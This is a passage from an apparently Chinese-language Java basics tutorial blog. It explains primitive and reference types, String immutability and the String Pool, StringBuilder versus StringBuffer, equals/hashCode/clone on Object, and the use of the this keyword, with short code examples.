title="boolean"></a>boolean</h4><p>在 Java 基本类型中只有两个状态，true、false，理论上只占一个字节，但是实际如下：</p><ul><li>单个的boolean类型变量在编译的时候是使用的 int 类型，即 boolean a = true 时，这个a在 JVM 中占用 4 个字节，即32位；</li><li>boolean类型的数组时，在编译时是作为byte array来编译的。所以，boolean数组里的每一个元件占用一个字节；即 boolean[] b = new boolean[10] 的数组时，每一个boolean在 JVM中占一个字节；</li></ul><p><strong>注意</strong>： float 和 double 都不能表示精确的值，所以一般不能用在计算货币，要想精度不失效，可以使用 BigDecimal</p><h4 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h4><p>在 Java 中引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。</p><ul><li>对象、数组都是引用数据类型；</li><li>所有引用类型的默认值都是null；</li><li>一个引用变量可以用来引用任何与之兼容的类型<br>我们的基本类型都有对应的引用类型，且基本类型与其对应的引用类型之间的赋值使用自动装箱与拆箱完成<h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a>自动装箱和拆箱</h4></li></ul><p>也可见 《JAVA基础知识复习(八)-包装类、装箱拆箱》博客内容。</p><p>自动拆箱：故名思议就是将对象重新转化为基本数据类型；是享元模式（flyweight）</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Integer num = <span class="hljs-number">10</span>;<span class="hljs-comment">//装箱</span><br><span class="hljs-keyword">int</span> num1 = num;<span class="hljs-comment">//拆箱</span><br></code></pre></div></td></tr></table></figure><p>基本数据类型和引用数据类型区别</p><ul><li>基本数据类型在被创建时，数值直接存储在栈上。</li><li>引用数据类型在被创建时，对象的具体信息都存储在堆内存上，对象的引用地址存储在栈上</li></ul><h4 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h4><p>String 不可变，String 类型 是一个final修饰的类型。因此它不可被继承。在 Java 8 中，String 内部使用 char 数组存储数据。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">String</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span>, <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">String</span>&gt;, <span class="hljs-title">CharSequence</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> value[];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。<br>String 不可变的好处</p><ul><li>可以缓存 hash 值：因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。</li><li>String Pool 的需要：如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。</li><li>安全性：String 不可变性天生具备线程安全，可以在多个线程中安全地使用。String 经常作为参数，String 不可变性可以保证参数不可变。</li></ul><h4 id="String赋值"><a href="#String赋值" class="headerlink" title="String赋值"></a>String赋值</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-string">&quot;bbb&quot;</span>;<br>String s2 = <span class="hljs-string">&quot;bbb&quot;</span>;<br>System.out.println(s5 == s6);  <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure><p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。而不是象new一样放在压缩堆中；当声明这样的一个字符串后，JVM会在常量池中先查找有没有一个值为”bbb”的对象，</p><ul><li>如果有：就会把它赋给当前引用。即原来那个引用和现在这个引用指点向了同一对象,</li><li>如果没有：则在常量池中新创建一个”bbb”,<br>下一次如果有String s2 = “bbb”；又会将s2指向”abcd”这个对象；即以这形式声明的字符串，只要值相等，任何多个引用都指向同一对象.</li></ul><p>而String s = new String(“abcd”);和其它任何对象一样，每调用一次就产生一个对象</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//代码1  </span><br>String sa = <span class="hljs-string">&quot;ab&quot;</span>;                                          <br>String sb = <span class="hljs-string">&quot;cd&quot;</span>;                                       <br>String sab=sa+sb;                                      <br>String s=<span class="hljs-string">&quot;abcd&quot;</span>;  <br>System.out.println(sab==s); <span class="hljs-comment">// false  </span><br><span class="hljs-comment">//当执行sa+sb时，JVM首先会在堆中创建一个StringBuilder类，将刚生成的String对象的堆地址存放在局部变量sab中</span><br><span class="hljs-comment">//局部变量 s 存储的是常量池中&quot;abcd&quot;所对应的拘留字符串对象的地址</span><br><br><span class="hljs-comment">//代码2  </span><br>String sc=<span class="hljs-string">&quot;ab&quot;</span>+<span class="hljs-string">&quot;cd&quot;</span>;  <br>String sd=<span class="hljs-string">&quot;abcd&quot;</span>;  <br>System.out.println(sc==sd); <span class="hljs-comment">//true  </span><br><span class="hljs-comment">//&quot;ab&quot;+&quot;cd&quot;会直接在编译期就合并成常量&quot;abcd&quot;， 因此相同字面值常量&quot;abcd&quot;所对应的是同一个拘留字符串对象，自然地址也就相同。</span><br></code></pre></div></td></tr></table></figure><p>扩展：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;abc&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 “abc” 字符串对象）。</p><ul><li>“abc” 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个字符串字面量；</li><li>而使用 new 的方式会在堆中创建一个字符串对象。</li></ul><h4 id="String、StringBuffer、-StringBuilder的区别"><a href="#String、StringBuffer、-StringBuilder的区别" class="headerlink" title="String、StringBuffer、 StringBuilder的区别"></a>String、StringBuffer、 StringBuilder的区别</h4><ul><li>从运行速度上说，StringBuilder&gt;StringBuffer&gt;String，因为String是不可变的对象</li><li>String：是字符串常量（由final修饰），StringBuffer和StringBuilder 是字符串变量</li><li>StringBuffer：有同步锁，但效率低，适用于多线程下字符缓冲区进行大量操作。</li><li>StringBuilder：效率高，线程不安全，适用于单线程下的字符缓冲区进行大量操作的情况；</li></ul><p>StringBuffer 和 StringBuilder 能大量操作字符的原理<br>在append是后，采用了Arrays.copyOf（） 进行了数组复制</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> StringBuffer <span class="hljs-title">append</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>    toStringCache = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">super</span>.append(String.valueOf(obj));<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-comment">// AbstractStringBuilder 类</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> AbstractStringBuilder <span class="hljs-title">append</span><span class="hljs-params">(String str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> appendNull();<br>    <span class="hljs-keyword">int</span> len = str.length();<br>    ensureCapacityInternal(count + len); <span class="hljs-comment">// 采用复制方式增加数组长度</span><br>    str.getChars(<span class="hljs-number">0</span>, len, value, count);<br>    count += len;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ensureCapacityInternal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> minimumCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (minimumCapacity - value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        value = Arrays.copyOf(value,<br>                              newCapacity(minimumCapacity));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="String-Pool"><a href="#String-Pool" class="headerlink" title="String Pool"></a>String Pool</h4><ul><li>字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定</li><li>String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;aaa&quot;</span>);<br>String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;aaa&quot;</span>);<br>System.out.println(s1 == s2);           <span class="hljs-comment">// false</span><br>String s3 = s1.intern();<br>String s4 = s2.intern();<br>System.out.println(s3 == s4);           <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure>String#intern 方法：intern 方法会从字符串常量池中查询当前字符串是否存在，若不存在就会将当前字符串放入常量池中返回这个新字符串的引用，若存在（使用 equals() 方法进行确定）那么就会返回 String Pool 中字符串的引用；</li></ul><p>在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。</p><h4 id="String-常用方法"><a href="#String-常用方法" class="headerlink" title="String 常用方法"></a>String 常用方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">endsWith</span><span class="hljs-params">(String suffix)</span> <span class="hljs-comment">//测试此字符串是否以指定的后缀结束</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(String prefix)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">char</span> <span class="hljs-title">charAt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span></span>;<span class="hljs-comment">//返回指定索引处的 char 值</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">indexOf</span><span class="hljs-params">(String str)</span> </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lastIndexOf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ch)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String[] <span class="hljs-title">split</span><span class="hljs-params">(String regex)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">substring</span><span class="hljs-params">(<span class="hljs-keyword">int</span> beginIndex)</span>   </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> oldChar,<span class="hljs-keyword">char</span> newChar)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">length</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><p>在 Java 中 Object 是所有的祖类。</p><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span></span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">native</span> Object <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; <span class="hljs-title">getClass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notify</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notifyAll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">long</span> timeout)</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">long</span> timeout, <span class="hljs-keyword">int</span> nanos)</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br></code></pre></div></td></tr></table></figure><p>equals()</p><ul><li>对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。</li><li>对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。<h4 id="“-”和equals的区别"><a href="#“-”和equals的区别" class="headerlink" title="“==”和equals的区别"></a>“==”和equals的区别</h4>==： 用来判断两个对象的内存地址是否相同（比较的是变量(栈)内存中存放的对象的(堆)内存地址，）。比较的是真正意义上的指针操作。</li></ul><p>equals：用来比较的是两个对象的内容是否相等。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;ab&quot;</span>); <span class="hljs-comment">// s1 为一个引用</span><br>String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;ab&quot;</span>); <span class="hljs-comment">// s2 为另一个引用,对象的内容一样</span><br>String s3 = <span class="hljs-string">&quot;ab&quot;</span>; <span class="hljs-comment">// 放在常量池中</span><br>String s4 = <span class="hljs-string">&quot;ab&quot;</span>; <span class="hljs-comment">// 从常量池中查找</span><br>System.out.println(s1 == s2); <span class="hljs-comment">// false</span><br>System.out.println(s3 == s4); <span class="hljs-comment">// true</span><br>System.out.println(s1 == s3); <span class="hljs-comment">// false</span><br>System.out.println(s1.equals(s2)); <span class="hljs-comment">// true</span><br>System.out.println(s3.equals(s4)); <span class="hljs-comment">// true</span><br>System.out.println(s1.equals(s3)); <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure><p>对equals重新需要注意五点：</p><blockquote><p>1 自反性：对任意引用值X，x.equals(x)的返回值一定为true；<br>2 对称性：对于任何引用值x,y,当且仅当y.equals(x)返回值为true时，x.equals(y)的返回值一定为true；<br>3 传递性：如果x.equals(y)=true, y.equals(z)=true,则x.equals(z)=true ；<br>4 一致性：如果参与比较的对象没任何改变，则对象比较的结果也不应该有任何改变；<br>5 非空性：任何非空的引用值X，x.equals(null)的返回值一定为false 。</p></blockquote><p><strong>注意</strong><br>自定义的类用equals比较时，仍然用的 == 在比较。因为自定义类默认继承的Object类中的equals方法，而Object类中的equals方法用的是 == 在比较。Object类中的equals方法代码如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">this</span> == obj);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>可以看见，用的是 == 来比较。所以，也是比较的地址值。例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Man p = <span class="hljs-keyword">new</span> Man(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;abcdef&quot;</span>); <span class="hljs-comment">//这里的Man为自定义类</span><br>        Man p1= <span class="hljs-keyword">new</span> Man(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;abcdef&quot;</span>);<br>        System.out.println(p.equals(p1));<br>        String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;qwer&quot;</span>);<br>        String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;qwer&quot;</span>);<br>        System.out.println(s1.equals(s2));<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><p>String 类中的equals 方法代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//注释为作者自加，并不是String类中所有的</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object anObject)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == anObject) &#123; <span class="hljs-comment">//首先比较两个的地址，如果地址都相同，那么内容一定是相同的</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (anObject <span class="hljs-keyword">instanceof</span> String) &#123; <span class="hljs-comment">//看两个是不是String类或String类的父类之一，不一定都一样。可以自行建两个类测试。是其之一才比较，不是就不需要比较了</span><br>            String aString = (String)anObject; <span class="hljs-comment">//把两个都转换成相同的String类</span><br>            <span class="hljs-keyword">if</span> (!COMPACT_STRINGS || <span class="hljs-keyword">this</span>.coder == aString.coder) &#123;<br>                <span class="hljs-keyword">return</span> StringLatin1.equals(value, aString.value);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p><strong>要想实现自定义类的 equals 方法比较值，而不是比较地址，可以重写 equals 方法。具体写法可以参考 Object 类和 String 类的equals 方法。</strong></p><h4 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h4><p>hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。</p><p>所以：在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。</p><h4 id="hashCode（）与equals（）"><a href="#hashCode（）与equals（）" class="headerlink" title="hashCode（）与equals（）"></a>hashCode（）与equals（）</h4><p>1.如果两个对象相等，则hashcode一定也是相同的<br>2.两个对象相等,对两个对象分别调用equals方法都返回true<br>3.两个对象有相同的hashcode值，它们也不一定是相等的<br>4.因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖<br>5.hashCode() 的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</p><h4 id="clone"><a href="#clone" class="headerlink" title="clone()"></a>clone()</h4><p>clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。</p><p>克隆（clone方法）为浅拷贝<br>1.浅拷贝：对基本数据类型进行值拷贝，对引用数据类型的引用地址进行拷贝，拷贝对象和原始对象的引用类型引用同一个对象</p><p>2.深拷贝： 对基本数据类型进行值拷贝，对引用数据类型的内容进行拷贝，拷贝对象和原始对象的引用类型引用不同对象。</p><p>深拷贝实现：</p><ul><li>序列化（serialization）这个对象，再反序列化回来，就可以得到这个新的对象，无非就是序列化的规则需要我们自己来写。</li><li>实现Clonable接口，覆盖并重写clone()，除了调用父类中的clone方法得到新的对象， 还要将该类中的引用变量也clone出来。如果只是用Object中默认的clone方法，是浅拷贝的<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Cloneable</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Test <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException </span>&#123;<br>Test newBody = (Test) <span class="hljs-keyword">super</span>.clone();<br>newBody.arr = arr.clone();    <span class="hljs-comment">// 深拷贝实现</span><br><span class="hljs-keyword">return</span> newBody;<br>&#125;<br>   <br>&#125;<br></code></pre></div></td></tr></table></figure>开发中常用的对象拷贝工具：<br>例如DozerMapper、Apache BeanUtils、Spring、Jodd BeanUtils、甚至是Cglib 都提供了这样的功能</li></ul><p>选择Cglib的 BeanCopier 进行Bean拷贝的理由是，其性能要比 **Spring的BeanUtils <strong>，</strong>Apache的BeanUtils **和 PropertyUtils 要好很多，尤其是数据量比较大的情况下</p><p>Cglib 的beans 包 操作:</p><ul><li>BeanCopier：用于两个bean之间，同名属性间的拷贝。</li><li>BulkBean：用于两个bean之间，自定义get&amp;set方法间的拷贝。</li><li>BeanMap：针对POJO Bean与Map对象间的拷贝。</li><li>BeanGenerator：根据Map&lt;String,Class&gt;properties的属性定义，动态生成POJO Bean类。</li></ul><h3 id="9-this关键字的使用"><a href="#9-this关键字的使用" class="headerlink" title="9.this关键字的使用"></a>9.this关键字的使用</h3><p>在一个类中，用来区分形参和类属性（在形参和类属性同名时）。不同名时可以不使用。加上 this 表示是当前对象或者是当前正在创建的对象。可以使用 “this.属性” 或者 “this.方法” 。<br>使用实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bank</span> </span>&#123;<br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">bank</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">bank</span><span class="hljs-params">(String name,<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name ;<br>        <span class="hljs-keyword">this</span>.age = age ;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setString</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name ;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span>&#123;<br>        age = a ;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="9-1-this调用构造函数"><a href="#9-1-this调用构造函数" class="headerlink" title="9.1 this调用构造函数"></a>9.1 this调用构造函数</h4><p>在一个类的构造函数中，可以再去调用此类的其他构造函数。<br>用法：this(参数列表)；</p><p>使用实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bank</span> </span>&#123;<br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">bank</span><span class="hljs-params">()</span></span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;A&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">bank</span><span class="hljs-params">(String name,<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>();<br>        System.out.println(<span class="hljs-string">&quot;B&quot;</span>);<br>    &#125;<br>    